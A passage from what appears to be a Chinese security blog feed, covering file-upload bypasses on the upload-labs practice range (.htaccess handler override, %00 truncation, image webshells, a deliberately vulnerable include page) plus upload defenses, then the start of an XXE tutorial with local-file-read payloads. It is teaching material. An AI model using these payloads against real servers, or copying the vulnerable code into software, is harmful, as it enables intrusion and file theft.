class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码对常见的多种类型文件后缀名进行了限制上传，但是仔细可以发现，并没有对<code>htaccess</code>文件进行限制。于是，我们可以先上传一个<code>htaccess</code>文件，再上传一个图片马，进行绕过检测上传。</p><p>.htaccess文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>这样所有文件都会当成php来解析</p><h2 id="绕过白名单检测"><a href="#绕过白名单检测" class="headerlink" title="绕过白名单检测"></a>绕过白名单检测</h2><p>白名单策略：文件扩展名不在白名单中为不合法。</p><p>绕过方法：服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00截断的方<br>式进行绕过。如应用本来只允许上传jpg图片，那么可以构造文件名为<code>xxx.php%00.jpg</code>,其中<code>%00</code>为十六进制的<code>0x00</code>字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为<code>%00</code>字符截断的关系，最终上传的文件变成了<code>xxx.php</code>。</p><p>测试：upload-labs/Pass-12</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232436067.png" alt="image-20210418232436067"></p><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><blockquote><p>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232327452.png" alt="image-20210418232327452"></p><h2 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h2><p>文件头校验原理：判断文件头内容是否符合要求。</p><p>常见的文件头对应关系：</p><ul><li>.jpeg、jpg：JPGGraphicFile</li><li>.gif：GIF 89A</li><li>.zip：Zip Compressed</li></ul><p>绕过文件头检查：上传图片马，通过添加文件头绕过图片类型内容检查。</p><p>突破getimagesize()函数：图像文件相关信息常用检测函数，用以获取文件类型，绕过只需要把文件头部分伪造好。</p><p>测试：upload-labs/Pass-14</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马(cmd下copy命令)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.gif /b + test.php /a shell.gif</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143058835.png" alt="image-20210424143058835"></p><p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143216004.png" alt="image-20210424143216004"></p><h1 id="上传漏洞检测"><a href="#上传漏洞检测" class="headerlink" title="上传漏洞检测"></a>上传漏洞检测</h1><ol><li>登陆网站，并打开文件上传页面。</li><li>点击“浏览”按钮，并选择本地的一个JSP文件(比如 hacker.jsp)，确认上传。</li><li>如果客户端脚本限制了上传文件的类型(比如允许gif文件)，则把 hacker.jsp 更名为 hacker.gif；配置 HTTP Proxy(burp) 进行 http 请求拦截；重新点击“浏览”按钮，并选择 hacker.gift，确认上传。</li><li>在WebScarab拦截的HTTP请求数据中，将 hacker.gif 修改为 hacker.jsp，再发送请求数据。</li><li>登陆后台服务器，用命令<code>find / -name hacker.jsp</code>查看 hacker.jsp 文件存放的路径。如果可以直接以Web方式访问，则构造访问的URL，并通过浏览器访问 hacker.jsp，如果可以正常访问，则已经取得WebShell，测试结束。如果 hacker.jsp 无法通过 web 方式访问，例如 hacker.jsp 存放在 /home/tmp/ 目录下，而 /home/tomcat/webapps 目录对应<a href="http://www.example.com/%EF%BC%8C%E5%88%99%E8%BF%9B%E8%A1%8C%E4%B8%8B%E4%B8%80%E6%AD%A5%E3%80%82">http://www.example.com/，则进行下一步。</a></li><li>重复1～3，在burp拦截的HTTP请求数据中，将hacker.gif修改为../tomcat/webapps/hacker.jsp，再发送请求数据。在浏览器地址栏输入<a href="http://www.example.com/hacker.jsp%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%AF%A5%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%96%E5%BE%97WebShell%EF%BC%8C%E7%BB%93%E6%9D%9F%E6%A3%80%E6%B5%8B%E3%80%82">http://www.example.com/hacker.jsp，访问该后门程序，取得WebShell，结束检测。</a></li></ol><h1 id="上传漏洞防御"><a href="#上传漏洞防御" class="headerlink" title="上传漏洞防御"></a>上传漏洞防御</h1><ol><li>文件上传的目录设置为不可执行<br>最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性。</li><li>判断文件类型<br>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li><li>使用随机数改写文件名和文件路径<br>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li><li>单独设置文件服务器的域名<br>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Web安全-文件上传漏洞与WAF绕过</a></p><p>[2] <a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">upload-labs通关记录</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="posts/19226.html"/>
      <url>posts/19226.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h1><p>XXE （XML EXternal Entity）即XML外部实体注入攻击，是一种常见的Web安全漏洞，发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。如当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>学习XXE，先来了解一下XML。</p><p>XML是一种用于标记电子文件使其具有结构性的可扩展标记语言(Extensible Markup Language） </p><p>XML是一种非常灵活的语言，类似于HTML语言，但是并没有固定的标签。所有的标签都可以自定义，其设计的宗旨是传输和存储数据，而不是像HTML一样显示数据。</p><p>XML不会做任何事情，它是被设计用来结构化、存储以及传输信息，也就是XML文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p><h2 id="XML解析"><a href="#XML解析" class="headerlink" title="XML解析"></a>XML解析</h2><p>流程图</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U329ff4f7d6a14d788b5e54a8f7ec05e3z.jpg" alt="图片"></p><ol><li>程序(Application)接收到用户传递过来的数据，然后将其交给XML Generator(XML生成器)。</li><li>XML Generator(XML生成器)在接收到程序传递过来的数据后,会将这些数据进行一个规范化，最终生成XML数据。</li><li>XML Generator(XML生成器)在生成XML数据后，然后会由我们的HTTP客户端(HTTP Client)将其(XML数据)通过HTTP协议传递给服务端(Web Server)。</li><li>Web Server在接收到XML数据后则会将其交给XML Parser(XML解析器)。</li><li>XML解析器则会对接收到的XML数据进行一个解析处理,然后将信息返回给程序(Application)，最终呈现给用户。</li></ol><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(1) XML 文档必须有一个根元素</span><br><span class="line">解释:就是说在XML文档中必须有一个元素是其他元素的父元素(也就是说其他元素必须包含在这个根元素下).根元素与其他元素的关系:父子关系.</span><br><span class="line"></span><br><span class="line">(2) XML 元素都必须有一个关闭标签</span><br><span class="line">解释:也就是说XML元素必须有头有尾,一对一对的出现.</span><br><span class="line"></span><br><span class="line">(3) XML 标签对大小敏感</span><br><span class="line">解释:XML标签的开始标签和闭合标签必须大小写一致.(不能一个大写一个小写)</span><br><span class="line">如:&lt;abc&gt;&lt;&#x2F;Abc&gt;       &#x2F;&#x2F;&#x2F;这样就是错误的!</span><br><span class="line"></span><br><span class="line">(4) XML 元素必须被正确的嵌套</span><br><span class="line">解释:XML元素在嵌套使用的时候,必须是一对一对的嵌套,不能只嵌套一个结束标签或一个开始标签.</span><br><span class="line">如:&lt;abc&gt;&lt;test&gt;&lt;&#x2F;abc&gt;&lt;&#x2F;test&gt;       &#x2F;&#x2F;这样就是错误的</span><br><span class="line">&lt;abc&gt;&lt;test&gt;&lt;&#x2F;test&gt;&lt;&#x2F;abc&gt;          &#x2F;&#x2F;正确的嵌套</span><br><span class="line"></span><br><span class="line">(5) XML 属性值必须加引号</span><br><span class="line">解释:XML元素在设置了属性后,其属性值必须用引号包裹.</span><br><span class="line">如:&lt;abc color&#x3D;blue&gt;               &#x2F;&#x2F;这样是错误的</span><br></pre></td></tr></table></figure><h2 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h2><p>XML结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210407213410158.png" alt="image-20210407213410158"></p><p>XML声明告诉浏览器这是一个XML文档。version属性是必须的，enconding属性说明文档的字符集编码。</p><p>我们可以把DTD理解为一个模板，这个模板里面定义了用户自己创建的根元素以及对应的子元素。而”文档元素”则必须以我们的DTD为模板，来对XML的元素的内容进行相应的规范化。</p><p><strong>PCDATA</strong> 的意思是被解析的字符数据（parsed character data），是会被解析器解析的文本，这些文本将被解析器检查实体以及标记。</p><p><strong>CDATA</strong> 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。而某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。</p><p>示例：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408221117818.png" alt="image-20210408221117818"></p><h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><p>除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><blockquote><p>用户可自定义的实体可以分为一般实体和参数实体</p><ol><li><p>一般实体的声明语法：<!ENTITY 实体名 "实体内容"><br>引用实体的方式：&amp;实体名；</p></li><li><p>参数实体<strong>只能在DTD中使用</strong>，参数实体的声明格式： <!ENTITY % 实体名 "实体内容"><br>引用实体的方式：%实体名;</p></li></ol></blockquote><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-string">&quot;hello,world&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">&lt;!--参数实体--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-string">&quot;&lt;!ENTITY hello &#x27;hello,world&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%test;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;hello;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>实体从引入方式来看还可以分为两种，外部实体和内部实体。</p><ol><li>外部实体定义需要加上 SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。</li><li>如果不加SYSTEM关键字，则为内部实体，表示实体指代内容为字符串。</li></ol></blockquote><p>上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用。</p><p>测试代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.dtd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部实体<code>&amp;xxe;</code>表示的就是引入的<code>test.dtd</code>中的内容。</p><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>引入外部实体可用的相关协议：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210112223950560.png"></p><p>既然它能按照路径引入外部的 <code>dtd </code>文件，那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = &lt;&lt;&lt;EOF</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/windows/system.ini&quot;</span>&gt; ]&gt; </span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,SimpleXMLElement,LIBXML_NOENT);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408000828498.png" alt="image-20210408000828498"></p><p>假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd)或者远程文件（<a href="http://www.baidu.com/abc.txt%EF%BC%89">http://www.baidu.com/abc.txt）</a></p><h1 id="XXE发现"><a href="#XXE发现" class="headerlink" title="XXE发现"></a>XXE发现</h1><ol><li><p>首先寻找接受XML作为输入内容的注入点。</p><p>可以通过修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的xml内容，如果解析了, 那么则可能有XXE攻击漏洞。</p><p>还可以尝试注入xml预定义的一些实体,看其是否报错，通过报错信息判断。</p></li><li><p>如果站点解析xml，就可以尝试引用实体和DTD 。</p></li><li><p>如果可以引用外部实体,则存在xxe漏洞</p></li></ol><h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ol><li>有回显的情况可以直接在页面中看到Payload的执行结果或现象(带内XML外部实体(XXE),即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的Web应用程序获取响应)</li></ol><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;xxe&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./xml.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line"><span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>读取本地文件</strong></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411175855619.png" alt="image-20210411175855619"></p><p>但是，当所读取文件中包含了<code>&lt;</code>或者<code>&amp;</code>等一些特殊符号时，会发现爆了一堆错而且读取不到该文件的内容。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411180142451.png" alt="image-20210411180142451"></p><p>原因是xml会把<code>&lt;</code>等特殊字符解析导致错误，那我们可以使用之前的<code>CDATA</code> 和参数实体来绕过。</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span 